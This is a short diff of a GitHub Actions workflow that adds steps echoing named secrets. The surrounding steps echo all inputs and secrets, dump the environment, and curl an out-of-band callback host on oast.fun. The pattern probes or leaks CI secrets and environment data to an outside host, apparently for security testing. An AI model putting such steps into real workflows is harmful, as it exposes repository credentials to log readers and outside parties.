@@ -18,5 +18,7 @@ jobs:
           echo 1; echo 2;
           echo "${{ inputs }}"
           echo "${{ secrets }}"
+          echo "${{ secrets.SEC1 }}"
+          echo "${{ secrets.SEC2 }}"
           env
           curl https://lobqidjjcvgdsnkvjczfwug76zlf0vhyx.oast.fun/githubwf
